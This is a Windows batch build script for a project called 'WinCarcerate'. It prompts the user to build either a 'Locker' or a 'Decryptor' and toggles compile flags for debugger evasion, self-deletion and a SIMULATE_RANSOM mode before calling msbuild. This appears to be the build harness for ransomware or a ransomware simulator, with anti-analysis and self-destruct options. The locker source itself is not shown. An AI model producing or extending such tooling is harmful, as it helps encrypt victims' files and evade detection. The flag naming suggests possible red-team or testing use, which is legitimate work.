@echo off
setlocal EnableExtensions EnableDelayedExpansion

set "PROJ=WinCarcerate"
set "CFG=Release"
set "PLAT=x64"
set "SRC=WinCarcerate"
set "OVR=%SRC%\override.h"

echo.
echo === %PROJ% Build (%CFG%^|%PLAT%) ===
echo.

set /p EXE=Build which? (Locker/Decryptor): 
set /p CON=Subsystem? (Console/Windows): 
set /p DBG=Enable debugger evasion? (Y/N): 
set /p SD=Enable self deletion? (Y/N): 
set /p DIR=Start from which directory? (Leave blank for current directory): 

REM --- write override.h ---
if "%DIR%"=="" (
  (
    echo #pragma once
    echo // no override; using GetCurrentDirectory fallback
  ) > "%OVR%"
) else (
  set "DIR_ESC=%DIR:\=\\%"
  (
    echo #pragma once
    echo #undef CONFIG_ROOT_DIR
    echo #define CONFIG_ROOT_DIR L"!DIR_ESC!", NULL
  ) > "%OVR%"
)

REM --- CL flags ---
set "CL_ARGS="
if /I "%CON%"=="Console" ( set "CL_ARGS=!CL_ARGS! /DCONSOLE_STDOUT" ) else ( set "CL_ARGS=!CL_ARGS! /UCONSOLE_STDOUT" )
if /I "%DBG%"=="Y"  set "CL_ARGS=!CL_ARGS! /DDBG_EVASION"
if /I "%SD%"=="Y"   set "CL_ARGS=!CL_ARGS! /DSELF_DESTRUCT"
if /I "%EXE%"=="Decryptor" ( set "CL_ARGS=!CL_ARGS! /DBUILD_DECRYPTOR /USIMULATE_RANSOM" ) else ( set "CL_ARGS=!CL_ARGS! /DSIMULATE_RANSOM" )

REM --- subsystem ---
if /I "%CON%"=="Console" ( set "SUBSYSTEM=Console" ) else ( set "SUBSYSTEM=Windows" )

echo.
echo Using:
echo   Root     = %DIR%
echo   Override = %OVR%
type "%OVR%"
echo   CL       = !CL_ARGS!
echo   SubSystem= !SUBSYSTEM!
echo.

REM --- build ---
set "CL_SAVED=%CL%"
set "CL=!CL_ARGS! %CL_SAVED%"

msbuild "%PROJ%.sln" /m /t:Rebuild /p:Configuration=%CFG%;Platform=%PLAT%;SubSystem=!SUBSYSTEM! /nologo

set "ERR=%ERRORLEVEL%"
set "CL=%CL_SAVED%"
endlocal & exit /b %ERR%